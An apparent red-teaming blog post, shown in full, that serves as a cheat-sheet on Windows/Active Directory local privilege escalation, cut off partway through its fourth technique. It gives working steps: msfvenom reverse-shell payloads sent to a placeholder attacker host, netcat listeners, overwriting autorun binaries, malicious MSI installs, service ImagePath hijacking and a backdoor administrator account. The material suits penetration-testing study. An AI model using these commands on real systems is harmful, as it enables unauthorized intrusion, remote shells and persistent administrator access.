<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Active Directory - Local Privilege Escalation" /><meta name="author" content="Bhaskar Pal" /><meta property="og:locale" content="en" /><meta name="description" content="Cyber security, Red Teaming and CTF Writeup’s" /><meta property="og:description" content="Cyber security, Red Teaming and CTF Writeup’s" /><link rel="canonical" href="https://0xstarlight.github.io/posts/Active-Directory-Windows-Local-Priv-Esc/" /><meta property="og:url" content="https://0xstarlight.github.io/posts/Active-Directory-Windows-Local-Priv-Esc/" /><meta property="og:site_name" content="0xStarlight" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-04-01T06:56:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Active Directory - Local Privilege Escalation" /><meta name="twitter:site" content="@Bhaskarpal__" /><meta name="twitter:creator" content="@Bhaskar Pal" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Bhaskar Pal"},"dateModified":"2022-04-01T06:56:00+05:30","datePublished":"2022-04-01T06:56:00+05:30","description":"Cyber security, Red Teaming and CTF Writeup’s","headline":"Active Directory - Local Privilege Escalation","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xstarlight.github.io/posts/Active-Directory-Windows-Local-Priv-Esc/"},"url":"https://0xstarlight.github.io/posts/Active-Directory-Windows-Local-Priv-Esc/"}</script><title>Active Directory - Local Privilege Escalation | 0xStarlight</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xStarlight"><meta name="application-name" content="0xStarlight"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://avatars.githubusercontent.com/u/59029171 " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xStarlight</a></div><div class="site-subtitle font-italic">Cyber security, Red Teaming and CTF Writeup's</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xStarlight" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Bhaskarpal__" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Bhaskarpal347','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Active Directory - Local Privilege Escalation</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Active Directory - Local Privilege Escalation</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1648776360" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-04-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3218 words"> <em>17 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://user-images.githubusercontent.com/59029171/160998210-a2a9a0a2-dc16-4383-8199-2afc54f22803.png" alt="image" data-proofer-ignore></p><h1 id="introduction"><span style="color:lightblue">Introduction</span></h1><p>Welcome to my third article in the Red Teaming Series (Active Directory Local Privilege Escalation). I hope everyone has gone through the first two articles of this series which go through the basic concepts required to understand Active Directory and high-level Domain enumeration explanation.</p><p>If not so, you can give it a read from <a href="https://0xstarlight.github.io/categories/red-teaming/">here</a>.</p><p>This guide aims to explain Windows/Active-Directory Local Privilege escalation snippets mainly by abusing services, registries, tokens and groups etc., in detail. I will also explain those terms that every pentester/red-teamer should control to understand the attacks performed in an Active Directory network. You may refer to this as a Cheat-Sheet also.</p><p>I will continue to update this article with new privilege escalation vectors.</p><blockquote><h2 id="throughout-the-article-i-will-use-powerview-winpeas-accesschk-and-powerup-in-performing-local-privilege-escalation-on-an-windowsactive-directory-environment-if-any-other-tools-are-required-they-will-be-mentioned-along"><span class="mr-2">Throughout the article, I will use <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1"><span class="mr-2">PowerView</a>, <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"><span class="mr-2">winPEAS</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk"><span class="mr-2">AccessChk</a> and <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1"><span class="mr-2">PowerUp</a> in performing local privilege escalation on an Windows/Active Directory Environment. If any other tools are required, they will be mentioned along.</span><a href="#throughout-the-article-i-will-use-powerview-winpeas-accesschk-and-powerup-in-performing-local-privilege-escalation-on-an-windowsactive-directory-environment-if-any-other-tools-are-required-they-will-be-mentioned-along" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2></blockquote><h1 id="what-is-privilege-escalation"><span style="color:lightblue">What is Privilege Escalation</span></h1><p>Privilege escalation exploits a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are generally protected from an application or user. Now that you know the meaning of privilege escalation, we can dive right into the techniques for escalation.</p><h1 id="autorun"><span style="color:lightblue">Autorun</span></h1><h2 id="methodology"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span></span><a href="#methodology" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Autorun is a type of Registry Escalation.</p><p>To ensure that the IT department creates a secure environment, Windows administrators often need to know what kind of access specific users or groups have to resources, including files, directories, Registry keys, global objects, and Windows services. AccessChk quickly answers these questions with an intuitive interface and output.</p><p>So basically, we can say a particular application in a specific directory gets automatically executed with administrator privileges once he logs on. This can be abused by finding the path location and dropping our malicious executable file through which we will gain administrator access.</p><h2 id="detection"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="using-autoruns-and-accesschk"><span class="mr-2">Using Autoruns and AccessChk</span><a href="#using-autoruns-and-accesschk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Transfer <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns64.exe</a> on the Windows/AD machine and execute it on cmd<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>Autoruns64.exe
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161002365-bde92ae0-b7f4-4978-b2eb-44498e6c42fb.png" alt="image" data-proofer-ignore></p><li>In Autoruns, click on the <code class="language-plaintext highlighter-rouge">"Logon"</code> tab.<li>From the listed results, notice that the <code class="language-plaintext highlighter-rouge">"My Program"</code> entry is pointing to <code class="language-plaintext highlighter-rouge">"C:\Program Files\Autorun Program\program.exe"</code>.<li>Go back to the command prompt run <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">AccessChk64.exe</a></ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>accesschk64.exe <span class="nt">-wvu</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogram Files</span><span class="se">\A</span><span class="s2">utorun Program"</span>
<span class="go">
</span><span class="gp">#</span><span class="w"> </span>Switch meaning
<span class="gp">#</span><span class="w"> </span>w <span class="nt">--</span><span class="o">&gt;</span> only show items that have write access
<span class="gp">#</span><span class="w"> </span>v <span class="nt">--</span><span class="o">&gt;</span> verbose<span class="p">;</span> dispaly as many details as possible
<span class="gp">#</span><span class="w"> </span>u <span class="nt">--</span><span class="o">&gt;</span> ignore the errors
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161004322-76f2e4e8-876c-4c00-abf5-7e0be381fdfd.png" alt="image" data-proofer-ignore></p><h3 id="using-powerup"><span class="mr-2">Using PowerUp</span><a href="#using-powerup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Run <a href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1">PowerUp</a> and Run <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code> (check the autoruns field)</ol><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>powershell <span class="nt">-ep</span> bypass
<span class="gp">PS C:\Temp&gt;</span><span class="nb">.</span> .<span class="se">\P</span>owerUp.sp1
<span class="gp">PS C:\Temp&gt;</span><span class="w"> </span>Invoke-AllChecks
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161005302-73ecbb10-e186-4a84-b086-c271976655f5.png" alt="image" data-proofer-ignore></p><p>From the output, notice that the <code class="language-plaintext highlighter-rouge">"Everyone"</code> user group has <code class="language-plaintext highlighter-rouge">"FILE_ALL_ACCESS"</code> permission on the <code class="language-plaintext highlighter-rouge">"program.exe"</code> file. To gain administrator access, we can drop our malicious executable file by overwriting on the file.</p><h2 id="exploitation"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm"><span class="mr-2">Kali VM</span><a href="#kali-vm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53 <span class="nt">-f</span> exe <span class="nt">-o</span> program.exe
</pre></table></code></div></div><li>Transfer the generated file, <code class="language-plaintext highlighter-rouge">program.exe</code>, to the Windows VM.</ol><h3 id="windows-vm"><span class="mr-2">Windows VM</span><a href="#windows-vm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>replace <code class="language-plaintext highlighter-rouge">program.exe</code> in <code class="language-plaintext highlighter-rouge">'C:\Program Files\Autorun Program'</code></ol><h3 id="kali-vm-1"><span class="mr-2">Kali VM</span><a href="#kali-vm-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="alwaysinstallelevated"><span style="color:lightblue">AlwaysInstallElevated</span></h1><h2 id="methodology-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>AlwaysInstallElevated is a type of Registry Escalation.</p><p>This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.</p><p>To install a package with elevated (system) privileges, set the AlwaysInstallElevated value to “1” under both of the following registry keys:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
</span></pre></table></code></div></div><p>If the AlwaysInstallElevated value is not set to “1” under both of the preceding registry keys, the installer uses elevated privileges to install managed applications and uses the current user’s privilege level for unmanaged applications.</p><h2 id="detection-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="windows-vm-1"><span class="mr-2">Windows VM</span><a href="#windows-vm-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Open command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>reg query HKLM<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">0x1</code> means its ON <img data-src="https://user-images.githubusercontent.com/59029171/161007111-57c898d9-d830-45a5-9a2c-f9e867f6c58b.png" alt="image" data-proofer-ignore></ul><li>In command prompt type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span>reg query HKCU<span class="se">\S</span>oftware<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">0x1</code> means its ON <img data-src="https://user-images.githubusercontent.com/59029171/161007974-38e7b355-0c5e-49ff-9886-6878bbbe86a6.png" alt="image" data-proofer-ignore></ul></ol><p>From the both output, we notice that <code class="language-plaintext highlighter-rouge">“AlwaysInstallElevated”</code> value is <code class="language-plaintext highlighter-rouge">1</code>. Hence, we can abuse this function to get privilege escalation.</p><h3 id="using-powerup-1"><span class="mr-2">Using PowerUp</span><a href="#using-powerup-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Run Powerup.ps1 and Run <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code> (check the AlwaysInstallElevated field)<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>powershell <span class="nt">-ep</span> bypass
<span class="gp">PS C:\Temp&gt;</span><span class="nb">.</span> .<span class="se">\P</span>owerUp.sp1
<span class="gp">PS C:\Temp&gt;</span><span class="w"> </span>Invoke-AllChecks
</pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161008622-848721f3-ddf2-4c17-af2a-a8e7f592a3e1.png" alt="image" data-proofer-ignore></p><li><p>Run <code class="language-plaintext highlighter-rouge">Write-UserAddMSI</code> and Add backdoor user in <em>Administrators</em> group (Required RDP access) <img data-src="https://user-images.githubusercontent.com/59029171/161009230-2b8b4782-60cc-4301-b1ac-d9595b34c392.png" alt="image" data-proofer-ignore></p><li>Check local Administrators<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>net localgroup administrators
<span class="gp">#</span><span class="w"> </span>now backdoor is added to the localgroup administrators group
</pre></table></code></div></div></ol><h2 id="exploitation-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-2"><span class="mr-2">Kali VM</span><a href="#kali-vm-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53 <span class="nt">-f</span> msi <span class="nt">-o</span> setup.msi
</pre></table></code></div></div><li>Copy the generated file, <code class="language-plaintext highlighter-rouge">setup.msi</code>, to the Windows VM.</ol><h3 id="windows-vm-2"><span class="mr-2">Windows VM</span><a href="#windows-vm-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Place <code class="language-plaintext highlighter-rouge">'setup.msi'</code> in <code class="language-plaintext highlighter-rouge">'C:\Temp'</code><li>Open command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>msiexec /quiet /qn /i C:<span class="se">\T</span>emp<span class="se">\s</span>etup.msi
</pre></table></code></div></div></ol><h3 id="kali-vm-3"><span class="mr-2">Kali VM</span><a href="#kali-vm-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="service-registry"><span style="color:lightblue">Service Registry</span></h1><h2 id="methodology-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>A service registry consists of a cluster of servers that use a replication protocol to maintain consistency. Hence if we get Full Contol permission over the registry key, we can drop our malicious executable file to gain administrator access.</p><h2 id="detection-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="windows-vm-3"><span class="mr-2">Windows VM</span><a href="#windows-vm-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Open powershell prompt and type:<div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">C:\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Acl</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">hklm:\System\CurrentControlSet\services\regsvc</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://user-images.githubusercontent.com/59029171/161015556-54353fa3-1278-451d-999e-38c3cc762f75.png" alt="image" data-proofer-ignore></p><li>Notice that the output suggests that user belong to <code class="language-plaintext highlighter-rouge">"NT AUTHORITY\INTERACTIVE"</code> has <code class="language-plaintext highlighter-rouge">"FullContol"</code> permission over the registry key.</ol><h2 id="exploitation-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Exploitation</span></span><a href="#exploitation-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="kali-vm-4"><span class="mr-2">Kali VM</span><a href="#kali-vm-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Start a netcat listener<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo </span>nc <span class="nt">-nvlp</span> 53
</pre></table></code></div></div><li>Open an additional command prompt and type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=[</span>tun0 IP] <span class="nv">LPORT</span><span class="o">=</span>53 <span class="nt">-f</span> exe <span class="nt">-o</span> x.exe
</pre></table></code></div></div><li>Copy the generated file <code class="language-plaintext highlighter-rouge">x.exe</code>, to the Windows VM.</ol><h3 id="windows-vm-4"><span class="mr-2">Windows VM</span><a href="#windows-vm-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Place <code class="language-plaintext highlighter-rouge">x.exe</code> in <code class="language-plaintext highlighter-rouge">'C:\Temp'</code><li>Open command prompt at type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>reg add HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\s</span>ervices<span class="se">\r</span>egsvc /v ImagePath /t REG_EXPAND_SZ /d c:<span class="se">\t</span>emp<span class="se">\x</span>.exe /f
</pre></table></code></div></div><li>In the command prompt type:<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">C:\Temp&gt;</span><span class="w"> </span>sc start regsvc
<span class="gp">#</span><span class="w"> </span>If it doesnt work try restaring the service and perform the exploit egain
</pre></table></code></div></div></ol><p><img data-src="https://user-images.githubusercontent.com/59029171/161016977-7757f360-5b46-4201-949a-9338e79f5735.png" alt="image" data-proofer-ignore></p><h3 id="kali-vm-5"><span class="mr-2">Kali VM</span><a href="#kali-vm-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>Wait for a reverse shell on your kali machine.</ol><h1 id="executable-files"><span style="color:lightblue">Executable Files</span></h1><h2 id="methodology-3"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology</span></span><a href="#methodology-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface.</p><p>Hence if we get Full Contol permission over the file path location, we can drop our malicious executable file to gain administrator access.</p><h2 id="detection-3"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Detection</span></span><a href="#detection-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Run Powerup.ps1 and Run <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code> (check the service executable field)<div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far 